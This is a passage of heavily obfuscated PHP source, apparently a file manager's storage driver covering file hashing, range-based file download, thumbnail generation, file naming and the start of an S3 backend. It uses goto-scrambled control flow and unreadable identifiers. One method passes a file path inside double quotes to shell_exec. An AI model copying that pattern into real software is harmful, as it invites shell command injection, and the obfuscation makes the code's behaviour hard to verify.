CäÍßæ‹‘Ì: } public static $md5Cache = array(); public function hashMd5($D½Ïößøö) { $D½Ïößøö = $this->iconvSystem($D½Ïößøö); if (isset(self::$md5Cache[$D½Ïößøö])) { return self::$md5Cache[$D½Ïößøö]; } self::$md5Cache[$D½Ïößøö] = $this->hashMd5Shell($D½Ïößøö); if (!self::$md5Cache[$D½Ïößøö]) { self::$md5Cache[$D½Ïößøö] = @md5_file($D½Ïößøö); } return self::$md5Cache[$D½Ïößøö]; } private function hashMd5Shell($e‹éÉ×‡ö‹) { goto AĞİõ÷‰”ù; AĞİõ÷‰”ù: $E³Ûµ‰¥ÊÈ =& $_SERVER[œÕÊİğö]; if (!function_exists($E³Ûµ‰¥ÊÈ[108])) { return !1; } $EõğõŒéŒ = array($E³Ûµ‰¥ÊÈ[109], $E³Ûµ‰¥ÊÈ[110]); goto EíÂõã¹ˆæ; EíÂõã¹ˆæ: $cÊÁ’¢‹‚Ò = Cache::get($E³Ûµ‰¥ÊÈ[111]); if (!$cÊÁ’¢‹‚Ò) { $C—Š¯×ÏãØ = BASIC_PATH . $E³Ûµ‰¥ÊÈ[112]; $açé£ÙÇ‹ = md5_file($C—Š¯×ÏãØ); $cÊÁ’¢‹‚Ò = $E³Ûµ‰¥ÊÈ[113]; foreach ($EõğõŒéŒ as $dÃï»›’æç) { $dÖÆÈì™ = shell_exec($dÃï»›’æç . "\x20\42{$C—Š¯×ÏãØ}\42"); if ($dÖÆÈì™ && substr(trim($dÖÆÈì™), 0, 32) == $açé£ÙÇ‹) { $cÊÁ’¢‹‚Ò = $dÃï»›’æç; break; } } Cache::set($E³Ûµ‰¥ÊÈ[111], $cÊÁ’¢‹‚Ò, 3600); } if ($cÊÁ’¢‹‚Ò == $E³Ûµ‰¥ÊÈ[113]) { return !1; } goto cİ‚Ë¡¶Øˆ; cİ‚Ë¡¶Øˆ: $dÖÆÈì™ = shell_exec($cÊÁ’¢‹‚Ò . "\x20\42{$e‹éÉ×‡ö‹}\x22"); $dÖÆÈì™ = str_replace($E³Ûµ‰¥ÊÈ[114], $E³Ûµ‰¥ÊÈ[43], $dÖÆÈì™); return substr($dÖÆÈì™, 0, 32); goto eáà‘¾ÔòÔ; eáà‘¾ÔòÔ: } public function link($A‘·Şùˆ¼) { return $A‘·Şùˆ¼; } public function fileOut($a¥Éƒ×ñ­…, $cåî…òÄÊØ = false, $aÒªŸß»ÚÃ = false, $C¦Ô¢“ªĞ = '') { goto Bàæ¼Áä; d¿ä‹³ĞßÜ: $dÁîÙéÆ·¢ = !0; if ($_SERVER[$F©ŠÌä‹Ò„[164]] == $F©ŠÌä‹Ò„[165] && $aĞ‚õÛÕÀÀ > 1204 * 1024 * 1024 * 2) { $dÁîÙéÆ·¢ = !1; } if ($dÁîÙéÆ·¢) { header($F©ŠÌä‹Ò„[166] . ($DÉ¶éåŠ‰• - $c’’Ê«˜„ã + 1)); } goto A°èç‹ÖÙ’; bƒ¼±™µ¯: $Bçò“‰ë¤ = strtolower($_SERVER[$F©ŠÌä‹Ò„[152]]); if ($Dµï·ÄÑî && $Bçò“‰ë¤ && $FâŠÊ‘ÑÂù) { if (strstr($Bçò“‰ë¤, $F©ŠÌä‹Ò„[153])) { header($F©ŠÌä‹Ò„[154] . $a¥Éƒ×ñ­…); } else { if (strstr($Bçò“‰ë¤, $F©ŠÌä‹Ò„[155])) { header($F©ŠÌä‹Ò„[156] . $a¥Éƒ×ñ­…); } else { if (strstr($Bçò“‰ë¤, $F©ŠÌä‹Ò„[157])) { header($F©ŠÌä‹Ò„[158] . $a¥Éƒ×ñ­…); } } } if ($c±½Ó—ÜÂÑ) { header($F©ŠÌä‹Ò„[159] . $c±½Ó—ÜÂÑ); } return; } if (isset($_SERVER[$F©ŠÌä‹Ò„[160]])) { if (preg_match($F©ŠÌä‹Ò„[161], $_SERVER[$F©ŠÌä‹Ò„[160]], $aÄİÇ×ø”Ğ)) { $c’’Ê«˜„ã = intval($aÄİÇ×ø”Ğ[1]); if (!empty($aÄİÇ×ø”Ğ[2])) { $DÉ¶éåŠ‰• = intval($aÄİÇ×ø”Ğ[2]); } } header($F©ŠÌä‹Ò„[162]); header("\x43\x6f\x6e\x74\x65\156\x74\55\x52\141\156\147\x65\x3a\x20\142\x79\164\145\x73\x20{$c’’Ê«˜„ã}\55{$DÉ¶éåŠ‰•}\x2f" . $aĞ‚õÛÕÀÀ); } else { header($F©ŠÌä‹Ò„[163]); } goto d¿ä‹³ĞßÜ; dÊ”ë×‘ô: $AŞË´äºô = get_file_mime($F»Ë»¬Îç ); if (strstr($AŞË´äºô, $F©ŠÌä‹Ò„[127])) { $AŞË´äºô = $AŞË´äºô . $F©ŠÌä‹Ò„[128]; } if ($cåî…òÄÊØ === !1 && !mime_support($AŞË´äºô)) { $cåî…òÄÊØ = !0; $AŞË´äºô = $F©ŠÌä‹Ò„[129]; } goto D¼˜îÛÙ‡À; e©·ó¶•¸ƒ: header($F©ŠÌä‹Ò„[148] . $aĞ‚õÛÕÀÀ); header($F©ŠÌä‹Ò„[149]); if (!$cåî…òÄÊØ && $F»Ë»¬Îç  == $F©ŠÌä‹Ò„[150]) { if ($aĞ‚õÛÕÀÀ > 1024 * 1024 * 5) { die; } $a»ÈÊ’º†³ = $this->getContent($a¥Éƒ×ñ­…); $a»ÈÊ’º†³ = Html::clearSVG($a»ÈÊ’º†³); header($F©ŠÌä‹Ò„[151] . strlen($a»ÈÊ’º†³)); echo $a»ÈÊ’º†³; die; } goto bƒ¼±™µ¯; Bàæ¼Áä: $F©ŠÌä‹Ò„ =& $_SERVER[œÕÊİğö]; $this->cacheMethod(null, null); if (!$a¥Éƒ×ñ­… || !$this->exist($a¥Éƒ×ñ­…)) { show_json(LNG($F©ŠÌä‹Ò„[115]), !1, $aÒªŸß»ÚÃ); } goto b˜•Ü‹ÕëÉ; Eõ¥ŸŞØØ™: $Aù‰‹ÁôÀå = $F©ŠÌä‹Ò„[126] . $Aù‰‹ÁôÀå . $F©ŠÌä‹Ò„[132] . $Aù‰‹ÁôÀå; if ($cåî…òÄÊØ) { header($F©ŠÌä‹Ò„[133]); header($F©ŠÌä‹Ò„[134] . $Aù‰‹ÁôÀå); } else { header($F©ŠÌä‹Ò„[135] . $Aù‰‹ÁôÀå); } header($F©ŠÌä‹Ò„[136] . gmdate($F©ŠÌä‹Ò„[120], time() + 3600 * 24 * 30) . $F©ŠÌä‹Ò„[137]); goto cöƒÉÔİŞç; D¼˜îÛÙ‡À: header($F©ŠÌä‹Ò„[130]); header($F©ŠÌä‹Ò„[131] . $AŞË´äºô); $Aù‰‹ÁôÀå = rawurlencode($fÇÂÉ¸Ÿø); goto Eõ¥ŸŞØØ™; d óçÌ¥‘: if (in_array($F»Ë»¬Îç , array($F©ŠÌä‹Ò„[121], $F©ŠÌä‹Ò„[122], $F©ŠÌä‹Ò„[123], $F©ŠÌä‹Ò„[124]))) { $F»Ë»¬Îç  = $F©ŠÌä‹Ò„[125]; } if (!$C¦Ô¢“ªĞ) { $C¦Ô¢“ªĞ = md5($E•¥ÑºäÎ§ . $this->hashSimple($a¥Éƒ×ñ­…)); } $C¦Ô¢“ªĞ = $F©ŠÌä‹Ò„[126] . $C¦Ô¢“ªĞ . $F©ŠÌä‹Ò„[126]; goto dÊ”ë×‘ô; e¼â‡Â”ì†: @ob_end_clean(); set_timeout(); $a£Ğ¤´Ö“ğ = $this->infoFull($a¥Éƒ×ñ­…); goto fçÈ¢º¡ğ¾; E¼º ‰Âö–: header($F©ŠÌä‹Ò„[145] . $E•¥ÑºäÎ§ . $F©ŠÌä‹Ò„[137]); header($F©ŠÌä‹Ò„[146] . $fÇÂÉ¸Ÿø); header($F©ŠÌä‹Ò„[147]); goto e©·ó¶•¸ƒ; c˜»Ù‹­¿–: if ($c±½Ó—ÜÂÑ) { $Fºˆ®²Ïô‰ = intval(1000 * 1000 * ($déÁÊÃ÷Ë  / $c±½Ó—ÜÂÑ)); } while ($c’’Ê«˜„ã <= $DÉ¶éåŠ‰•) { $C¡¯¾š¶¦™ = timeFloat(); check_abort(); $cîŠ‚Ê•‰˜ = $DÉ¶éåŠ‰• - $c’’Ê«˜„ã + 1; if ($cîŠ‚Ê•‰˜ <= $déÁÊÃ÷Ë ) { $déÁÊÃ÷Ë  = $cîŠ‚Ê•‰˜; } echo $this->fileSubstr($a¥Éƒ×ñ­…, $c’’Ê«˜„ã, $déÁÊÃ÷Ë ); $c’’Ê«˜„ã += $déÁÊÃ÷Ë ; if ($déÁÊÃ÷Ë  == $cîŠ‚Ê•‰˜) { $c’’Ê«˜„ã = $DÉ¶éåŠ‰• + 1; } if ($Fºˆ®²Ïô‰) { $cŠ•µÄÔÄƒ = intval(1000 * 1000 * (timeFloat() - $C¡¯¾š¶¦™)); $fÏ»²˜œ‚’ = $Fºˆ®²Ïô‰ - $cŠ•µÄÔÄƒ; if ($fÏ»²˜œ‚’ > 5) { usleep($fÏ»²˜œ‚’); } } } goto aô–ì†ƒÖ¯; b˜•Ü‹ÕëÉ: $Dµï·ÄÑî = $this->getType() == $F©ŠÌä‹Ò„[116]; $FâŠÊ‘ÑÂù = $GLOBALS[$F©ŠÌä‹Ò„[6]][$F©ŠÌä‹Ò„[98]][$F©ŠÌä‹Ò„[117]][$F©ŠÌä‹Ò„[118]]; $c±½Ó—ÜÂÑ = (double) $GLOBALS[$F©ŠÌä‹Ò„[6]][$F©ŠÌä‹Ò„[98]][$F©ŠÌä‹Ò„[117]][$F©ŠÌä‹Ò„[119]] * 1024 * 1024; goto e¼â‡Â”ì†; cöƒÉÔİŞç: header($F©ŠÌä‹Ò„[138]); header($F©ŠÌä‹Ò„[139]); header($F©ŠÌä‹Ò„[140]); goto e¬ÕŸÍ¡ˆí; fçÈ¢º¡ğ¾: $aĞ‚õÛÕÀÀ = $a£Ğ¤´Ö“ğ[$F©ŠÌä‹Ò„[88]]; $E•¥ÑºäÎ§ = gmdate($F©ŠÌä‹Ò„[120], $a£Ğ¤´Ö“ğ[$F©ŠÌä‹Ò„[94]]); $fÇÂÉ¸Ÿø = $aÒªŸß»ÚÃ ? $aÒªŸß»ÚÃ : $this->iconvApp($a£Ğ¤´Ö“ğ[$F©ŠÌä‹Ò„[38]]); goto A‹“ÂÉ“ö§; e¬ÕŸÍ¡ˆí: if (isset($_SERVER[$F©ŠÌä‹Ò„[141]]) && strtotime($_SERVER[$F©ŠÌä‹Ò„[141]]) == $a£Ğ¤´Ö“ğ[$F©ŠÌä‹Ò„[94]]) { header($F©ŠÌä‹Ò„[142], !0, 304); die; } if (isset($_SERVER[$F©ŠÌä‹Ò„[143]]) && $_SERVER[$F©ŠÌä‹Ò„[143]] == $C¦Ô¢“ªĞ) { header($F©ŠÌä‹Ò„[144] . $C¦Ô¢“ªĞ, !0, 304); die; } header($F©ŠÌä‹Ò„[144] . $C¦Ô¢“ªĞ); goto E¼º ‰Âö–; A°èç‹ÖÙ’: if ($_SERVER[$F©ŠÌä‹Ò„[167]] == $F©ŠÌä‹Ò„[168]) { return; } $déÁÊÃ÷Ë  = 1024 * 100; $Fºˆ®²Ïô‰ = 0; goto c˜»Ù‹­¿–; A‹“ÂÉ“ö§: $c’’Ê«˜„ã = 0; $DÉ¶éåŠ‰• = $aĞ‚õÛÕÀÀ - 1; $F»Ë»¬Îç  = $this->ext($fÇÂÉ¸Ÿø); goto d óçÌ¥‘; aô–ì†ƒÖ¯: } public function fileOutServer($b¼—×¾õÅ·, $e˜ÄáÀ•²³ = false, $cí²¤ïå¢˜ = false, $F¼²¶œÁá‚ = '') { $this->fileOut($b¼—×¾õÅ·, $e˜ÄáÀ•²³, $cí²¤ïå¢˜, $F¼²¶œÁá‚); } public function fileOutLink($AÂåííÄë) { header($_SERVER[œÕÊİğö][169] . $AÂåííÄë); die; } public function cacheMethod($D¸ŸÜËê, $D™¢’ôİ‰, $D¼Ä”™áğö = null) { goto c¤¸Ô„µèé; D­ë´ÄÕï¤: $E£æ¥àí‹³ = $this->{$D¸ŸÜËê}($D™¢’ôİ‰); $B ½²Ÿ´ŠÖ[$d°ÙŒÁ°Ôé] = $E£æ¥àí‹³; return $E£æ¥àí‹³; goto c¼Ù¥Ñò¨™; a‘æÊõÎæœ: $d°ÙŒÁ°Ôé = $CŞéà¬¸£ƒ[170] . $D¸ŸÜËê . $CŞéà¬¸£ƒ[171] . rtrim($AÓİ²±Œñ, $CŞéà¬¸£ƒ[8]); if (is_null($D¸ŸÜËê)) { $B ½²Ÿ´ŠÖ = array(); return; } if (is_null($D™¢’ôİ‰)) { unset($B ½²Ÿ´ŠÖ[$d°ÙŒÁ°Ôé]); return; } goto cñ¢ ÙÓÛ; c¤¸Ô„µèé: $CŞéà¬¸£ƒ =& $_SERVER[œÕÊİğö]; static $B ½²Ÿ´ŠÖ = array(); $AÓİ²±Œñ = $D™¢’ôİ‰ ? ltrim($this->getPathOuter($D™¢’ôİ‰), $CŞéà¬¸£ƒ[8]) : $D™¢’ôİ‰; goto a‘æÊõÎæœ; cñ¢ ÙÓÛ: if (!is_null($D¼Ä”™áğö)) { $B ½²Ÿ´ŠÖ[$d°ÙŒÁ°Ôé] = $D¼Ä”™áğö; return; } $E£æ¥àí‹³ = isset($B ½²Ÿ´ŠÖ[$d°ÙŒÁ°Ôé]) ? $B ½²Ÿ´ŠÖ[$d°ÙŒÁ°Ôé] : null; if (!is_null($E£æ¥àí‹³)) { return $E£æ¥àí‹³; } goto D­ë´ÄÕï¤; c¼Ù¥Ñò¨™: } public function fileOutImage($dÚà÷Ğøª, $BØØÅ ³˜ = 250) { goto aë¬šôĞ; dİŒĞÈ¦š‚: if (!@file_exists($bŞöøéÃÒÒ)) { $B¯—Ø‘èˆ = TEMP_FILES; if (!is_dir($B¯—Ø‘èˆ)) { mk_dir($B¯—Ø‘èˆ); } $C…¬ñÅÙ¾« = $B¯—Ø‘èˆ . $a©‚ï»Î´ . $CèÛ°œ„Äß[105] . $B“«ç¢à»ë[$CèÛ°œ„Äß[178]]; if (!@file_exists($C…¬ñÅÙ¾«)) { $C…¬ñÅÙ¾« = $this->download($dÚà÷Ğøª, $C…¬ñÅÙ¾«); } ImageThumb::createThumb($C…¬ñÅÙ¾«, $bŞöøéÃÒÒ, $BØØÅ ³˜, $BØØÅ ³˜ * 10); } if (!file_exists($bŞöøéÃÒÒ) || filesize($bŞöøéÃÒÒ) < 100) { return @file_exists($C…¬ñÅÙ¾«) ? IO::fileOut($C…¬ñÅÙ¾«) : $this->fileOut($dÚà÷Ğøª); } if (!($c¯ƒš˜Œ‚ = IO::move($bŞöøéÃÒÒ, $eŸÛºÔò—±))) { return IO::fileOut($bŞöøéÃÒÒ); } goto bÁ¬‘ø•ê; DìÑ²èÜŸ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $bŞöøéÃÒÒ = DATA_THUMB . $D´°”Öˆ¹Ä; del_file($bŞöøéÃÒÒ); goto dİŒĞÈ¦š‚; aë¬šôĞ: $CèÛ°œ„Äß =& $_SERVER[œÕÊİğö]; set_timeout(); if (substr($dÚà÷Ğøª, 0, 4) == $CèÛ°œ„Äß[157]) { $this->fileOutLink($dÚà÷Ğøª); } goto b ·Á‰ÂŒù; b ·Á‰ÂŒù: $B“«ç¢à»ë = $this->info($dÚà÷Ğøª); $cÊöÀŠ©ïˆ = $B“«ç¢à»ë[$CèÛ°œ„Äß[38]]; $A¸ƒÂŸ½Ìì = !1; goto DøÜñÈ·š; bÁ¬‘ø•ê: del_file($bŞöøéÃÒÒ); IO::fileOut($c¯ƒš˜Œ‚); goto C»ªíŒ¡Ï…; F¶èÈ’ ­ì: $D´°”Öˆ¹Ä = "{$a©‚ï»Î´}\137{$BØØÅ ³˜}\x2e\x70\x6e\147"; if (!($bÀîºŒÈ˜ª = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $CèÛ°œ„Äß[182]))) { $eŸÛºÔò—± = IO::mkdir(IO_PATH_SYSTEM_TEMP . $CèÛ°œ„Äß[183]); } else { $eŸÛºÔò—± = KodIO::make($bÀîºŒÈ˜ª); } if ($bÀîºŒÈ˜ª = IO::fileNameExist($eŸÛºÔò—±, $D´°”Öˆ¹Ä)) { $bŞöøéÃÒÒ = KodIO::make($bÀîºŒÈ˜ª); return IO::fileOut($bŞöøéÃÒÒ, !1, $cÊöÀŠ©ïˆ); } goto DìÑ²èÜŸ; DøÜñÈ·š: if (isset($GLOBALS[$CèÛ°œ„Äß[172]]) && $GLOBALS[$CèÛ°œ„Äß[172]][$CèÛ°œ„Äß[86]] == $B“«ç¢à»ë[$CèÛ°œ„Äß[86]]) { $C¢‹Ğõâİ = $GLOBALS[$CèÛ°œ„Äß[172]][$CèÛ°œ„Äß[173]]; if (!$B“«ç¢à»ë[$CèÛ°œ„Äß[174]]) { $B“«ç¢à»ë[$CèÛ°œ„Äß[174]] = $GLOBALS[$CèÛ°œ„Äß[172]]; } if (isset($C¢‹Ğõâİ[$CèÛ°œ„Äß[175]])) { if ($C¢‹Ğõâİ[$CèÛ°œ„Äß[175]] <= $BØØÅ ³˜ && $C¢‹Ğõâİ[$CèÛ°œ„Äß[176]] <= $BØØÅ ³˜) { $A¸ƒÂŸ½Ìì = !0; } } $cÊöÀŠ©ïˆ = $B“«ç¢à»ë[$CèÛ°œ„Äß[174]][$CèÛ°œ„Äß[38]]; } if ($B“«ç¢à»ë[$CèÛ°œ„Äß[88]] <= 1024 * 50 || $A¸ƒÂŸ½Ìì || !function_exists($CèÛ°œ„Äß[177]) || $B“«ç¢à»ë[$CèÛ°œ„Äß[178]] == $CèÛ°œ„Äß[179]) { return $this->fileOut($dÚà÷Ğøª, !1, $cÊöÀŠ©ïˆ); } if (isset($B“«ç¢à»ë[$CèÛ°œ„Äß[174]][$CèÛ°œ„Äß[180]])) { $a©‚ï»Î´ = $B“«ç¢à»ë[$CèÛ°œ„Äß[174]][$CèÛ°œ„Äß[180]]; } else { if (isset($B“«ç¢à»ë[$CèÛ°œ„Äß[174]][$CèÛ°œ„Äß[181]])) { $a©‚ï»Î´ = $B“«ç¢à»ë[$CèÛ°œ„Äß[174]][$CèÛ°œ„Äß[181]]; } else { $a©‚ï»Î´ = md5("{$B“«ç¢à»ë[$CèÛ°œ„Äß[38]]}\x5f{$B“«ç¢à»ë[$CèÛ°œ„Äß[86]]}\x5f{$B“«ç¢à»ë[$CèÛ°œ„Äß[88]]}"); } } goto F¶èÈ’ ­ì; C»ªíŒ¡Ï…: } public function fileOutImageServer($AœĞÉ¡êùó, $F¶‰ĞÍç“Ù = 250) { $this->fileOutImage($AœĞÉ¡êùó, $F¶‰ĞÍç“Ù); } public function fileNameAuto($eØœÛÂÙ‘¨, $eœŠÈéì†ø, $EÅ»Ÿ ö‚ = REPEAT_RENAME, $fÌ¶Úâ±Ğñ = false) { goto a…’š›¯Ş¨; CÖæ¦Ô×Â­: $e­ßêµÃõø = 1; $Aˆé‡§š© = substr($eœŠÈéì†ø, 0, strlen($eœŠÈéì†ø) - strlen($AÍ«È‚Ÿ§–)); $Fá´½Œãö± = $Aˆé‡§š© . "\50{$e­ßêµÃõø}\x29{$AÍ«È‚Ÿ§–}"; goto cƒ”â„×Ùğ; BÎ¬îŸÉñ¹: if ($EÅ»Ÿ ö‚ == REPEAT_SKIP) { return !1; } $AÍ«È‚Ÿ§– = $Bçƒñ©ĞˆÍ[105] . get_path_ext($eœŠÈéì†ø); $AÍ«È‚Ÿ§– = $AÍ«È‚Ÿ§– == $Bçƒñ©ĞˆÍ[105] || $fÌ¶Úâ±Ğñ ? $Bçƒñ©ĞˆÍ[43] : $AÍ«È‚Ÿ§–; goto CÖæ¦Ô×Â­; a…’š›¯Ş¨: $Bçƒñ©ĞˆÍ =& $_SERVER[œÕÊİğö]; $B™¼»ˆÍÒ = $eØœÛÂÙ‘¨ === $Bçƒñ©ĞˆÍ[43] ? $eœŠÈéì†ø : rtrim($eØœÛÂÙ‘¨, $Bçƒñ©ĞˆÍ[8]) . $Bçƒñ©ĞˆÍ[8] . $eœŠÈéì†ø; if ($EÅ»Ÿ ö‚ == REPEAT_REPLACE || !$this->exist($B™¼»ˆÍÒ) || $fÌ¶Úâ±Ğñ && $EÅ»Ÿ ö‚ != REPEAT_RENAME_FOLDER) { return $eœŠÈéì†ø; } goto BÎ¬îŸÉñ¹; cƒ”â„×Ùğ: while ($this->exist(rtrim($eØœÛÂÙ‘¨, $Bçƒñ©ĞˆÍ[8]) . $Bçƒñ©ĞˆÍ[8] . $Fá´½Œãö±)) { $Fá´½Œãö± = $Aˆé‡§š© . "\50{$e­ßêµÃõø}\x29{$AÍ«È‚Ÿ§–}"; $e­ßêµÃõø++; } return $Fá´½Œãö±; goto D¦çŠÃÌÒâ; D¦çŠÃÌÒâ: } private function fileNameAutoList($DÛŠá¯Ì£İ, $D…ê²öÕÌ’, $d¬¡‰í—ã¾ = false) { goto A˜‡ÇÙë˜ˆ; A˜‡ÇÙë˜ˆ: $Aà†¯¤Ú¿Š =& $_SERVER[œÕÊİğö]; $Dò§µ„ë¬Ù = $this->listPath($DÛŠá¯Ì£İ, !0); $Dò§µ„ë¬Ù = array_merge($Dò§µ„ë¬Ù[$Aà†¯¤Ú¿Š[85]], $Dò§µ„ë¬Ù[$Aà†¯¤Ú¿Š[84]]); goto eÔöóùÁ–; eÔöóùÁ–: $AÀÓíÂäê = array_to_keyvalue($Dò§µ„ë¬Ù, $Aà†¯¤Ú¿Š[43], $Aà†¯¤Ú¿Š[38]); $DÅïÏØŠõÅ = $Aà†¯¤Ú¿Š[105] . get_path_ext($D…ê²öÕÌ’); $DÅïÏØŠõÅ = $DÅïÏØŠõÅ == $Aà†¯¤Ú¿Š[105] || $d¬¡‰í—ã¾ ? $Aà†¯¤Ú¿Š[43] : $DÅïÏØŠõÅ; goto eÔÅ÷ÜÏÜÔ; eÔÅ÷ÜÏÜÔ: $aëÖˆ‡î– = substr($D…ê²öÕÌ’, 0, strlen($D…ê²öÕÌ’) - strlen($DÅïÏØŠõÅ)); $Fù¦œàÖ“² = $aëÖˆ‡î– . "\50\60\x29{$DÅïÏØŠõÅ}"; for ($bÅîæèÊå« = 1; $bÅîæèÊå« <= count($AÀÓíÂäê) + 1; $bÅîæèÊå«++) { $Fù¦œàÖ“² = $aëÖˆ‡î– . "\x28{$bÅîæèÊå«}\x29{$DÅïÏØŠõÅ}"; if (!in_array_not_case($Fù¦œàÖ“², $AÀÓíÂäê)) { return $Fù¦œàÖ“²; } } goto BåÇà±ñ…; BåÇà±ñ…: return $Fù¦œàÖ“²; goto cğùïƒ©é; cğùïƒ©é: } public function listAllFiles($d–ÄĞ‚¢Û, $b¿ªôÑ‚ˆË, $Eç¦¦®®Ç‰ = array()) { goto E½¸Æ¤È Û; FÍ ô¢Ø: foreach (array_unique($b¦»Í´¯îá) as $bá¥Ò¤¥²Š) { $A–À¢Ïš‚ = array($BêÆ¿ÀÑ‘[86] => $this->getPathOuter($BêÆ¿ÀÑ‘[8] . $d–ÄĞ‚¢Û . $BêÆ¿ÀÑ‘[8] . $bá¥Ò¤¥²Š), $BêÆ¿ÀÑ‘[87] => 1, $BêÆ¿ÀÑ‘[88] => 0); if (substr($bá¥Ò¤¥²Š, -1) != $BêÆ¿ÀÑ‘[8]) { $A–À¢Ïš‚[$BêÆ¿ÀÑ‘[87]] = 0; $c—˜Õø¡Ú = $this->getPath($d–ÄĞ‚¢Û . $BêÆ¿ÀÑ‘[8] . $bá¥Ò¤¥²Š); $A–À¢Ïš‚[$BêÆ¿ÀÑ‘[88]] = isset($Eç¦¦®®Ç‰[$c—˜Õø¡Ú]) ? $Eç¦¦®®Ç‰[$c—˜Õø¡Ú] : $this->size($c—˜Õø¡Ú); } $Bß„Ë§ôí[] = $A–À¢Ïš‚; } return $Bß„Ë§ôí; goto e½É¸ã›Õ°; eõ¬İ¾Š÷¨: $d–ÄĞ‚¢Û = trim($d–ÄĞ‚¢Û, $BêÆ¿ÀÑ‘[8]); foreach ($b¿ªôÑ‚ˆË as $bá¥Ò¤¥²Š) { $bö˜ÕÑª°‡ = ltrim(substr(trim($bá¥Ò¤¥²Š, $BêÆ¿ÀÑ‘[8]), strlen($d–ÄĞ‚¢Û)), $BêÆ¿ÀÑ‘[8]); $b¦»Í´¯îá = array_merge($b¦»Í´¯îá, $this->slicePath($bö˜ÕÑª°‡)); } $Bß„Ë§ôí = array(); goto FÍ ô¢Ø; E½¸Æ¤È Û: $BêÆ¿ÀÑ‘ =& $_SERVER[œÕÊİğö]; if (empty($b¿ªôÑ‚ˆË)) { return array(); } $b¦»Í´¯îá = array(); goto eõ¬İ¾Š÷¨; e½É¸ã›Õ°: } public function slicePath($f¦©„¾ê‡Ç) { $e‘ÃœĞÙÇô =& $_SERVER[œÕÊİğö]; $F“Ãƒ÷õŞ = explode($e‘ÃœĞÙÇô[8], trim($f¦©„¾ê‡Ç, $e‘ÃœĞÙÇô[8])); $B„Ä›²§‹† = 0; do { ++$B„Ä›²§‹†; $eæÏë˜—©[] = implode($e‘ÃœĞÙÇô[8], array_slice($F“Ãƒ÷õŞ, 0, $B„Ä›²§‹†)) . $e‘ÃœĞÙÇô[8]; } while ($B„Ä›²§‹† < count($F“Ãƒ÷õŞ)); $eæÏë˜—©[count($F“Ãƒ÷õŞ) - 1] = $f¦©„¾ê‡Ç; return $eæÏë˜—©; } public function getHost() { $d‹ÈéË‡Îø =& $_SERVER[œÕÊİğö]; $eéÚñÒ„¥Æ = parse_url(trim($this->domain, $d‹ÈéË‡Îø[8])); $cÆœ¡ôŠö = isset($eéÚñÒ„¥Æ[$d‹ÈéË‡Îø[184]]) ? $eéÚñÒ„¥Æ[$d‹ÈéË‡Îø[184]] : http_type(); $BÙãã¶Â„‹ = isset($eéÚñÒ„¥Æ[$d‹ÈéË‡Îø[185]]) ? $eéÚñÒ„¥Æ[$d‹ÈéË‡Îø[185]] : $eéÚñÒ„¥Æ[$d‹ÈéË‡Îø[86]]; if (isset($eéÚñÒ„¥Æ[$d‹ÈéË‡Îø[186]])) { $BÙãã¶Â„‹ .= $d‹ÈéË‡Îø[4] . $eéÚñÒ„¥Æ[$d‹ÈéË‡Îø[186]]; } return $cÆœ¡ôŠö . $d‹ÈéË‡Îø[187] . $BÙãã¶Â„‹; } public function pathEncode($b„ˆÚƒİÈ–) { $D÷Ø±´”‹¬ =& $_SERVER[œÕÊİğö]; return str_replace($D÷Ø±´”‹¬[188], $D÷Ø±´”‹¬[8], rawurlencode($b„ˆÚƒİÈ–)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($bšŒµ‘­) { set_timeout(); require_once SDK_DIR . $_SERVER[œÕÊİğö][189]; parent::__construct(); $this->_init($bšŒµ‘­); } public function _init($eé¸ŞÓØ™) { foreach ($eé¸ŞÓØ™ as $D£Åƒ¢­ => $F÷œ•Ÿï†³) { if (isset($this->{$D£Åƒ¢­})) { $this->{$D£Åƒ¢­} = $F÷œ•Ÿï†³; } } $this->endpoint = $eé¸ŞÓØ™[$_SERVER[œÕÊİğö][190]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($bÖ¹¥„‹Ô¯ = "\166\x34") { $this->signVer = $bÖ¹¥„‹Ô¯; $this->client->setSignatureVersion($bÖ¹¥„‹Ô¯); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto eÛíğõ÷„”; b—Ñ³ì†„ù: if ($a­§ÒÌºŸÛ[$CŸã¤Ú¢Ø[191]] != $CŸã¤Ú¢Ø[192] || $a­§ÒÌºŸÛ[$CŸã¤Ú¢Ø[193]] != $CŸã¤Ú¢Ø[192]) { return !1; } $E·àùßÖŸˆ = array_map($CŸã¤Ú¢Ø[194], $a­§ÒÌºŸÛ[$CŸã¤Ú¢Ø[195]]); if (!is_array($E·àùßÖŸˆ)) { $E·àùßÖŸˆ = array(); } goto EÈ«Ú“¡ë; EÈ«Ú“¡ë: $D›à–§¶¼· = array($CŸã¤Ú¢Ø[196], $CŸã¤Ú¢Ø[197], $CŸã¤Ú¢Ø[198], $CŸã¤Ú¢Ø[199], $CŸã¤Ú¢Ø[200]); $b•²îä­¢ = array_diff($D›à–§¶¼·, $E·àùßÖŸˆ); return empty($b•²îä­¢); goto e›Š²¯Œç; eÛíğõ÷„”: $CŸã¤Ú¢Ø =& $_SERVER[œÕÊİğö]; $a­§ÒÌºŸÛ = $this->getBucketCors(); if (!$a­§ÒÌºŸÛ || !is_array($a­§ÒÌºŸÛ)) { return !1; } goto b—Ñ³ì†„ù; e›Š²¯Œç: } public function mkfile($c¸ä‡±×è, $fÙ¨òœ²› = '', $BÂÏõ”‰Ö = REPEAT_RENAME) { $b³‚õ‡ç·« = $this->setContent($c¸ä‡±×è, $fÙ¨òœ²›); if ($b³‚õ‡ç·« !== !1) { return $this->getPathOuter($c¸ä‡±×è); } return !1; } public function mkdir($EãÓÊ‚›Õ, $cÜéª Å„™ = REPEAT_SKIP) { $B¼·¢ÈÆ­ =& $_SERVER[œÕÊİğö]; if (empty($EãÓÊ‚›Õ) && $EãÓÊ‚›Õ !== $B¼·¢ÈÆ­[201]) { return !1; } if ($this->_isFolder($EãÓÊ‚›Õ)) { return $this->getPathOuter($EãÓÊ‚›Õ); } $a¸Ş—µ‘½´ = $this->setContent($EãÓÊ‚›Õ, $B¼·¢ÈÆ­[43], !0); if 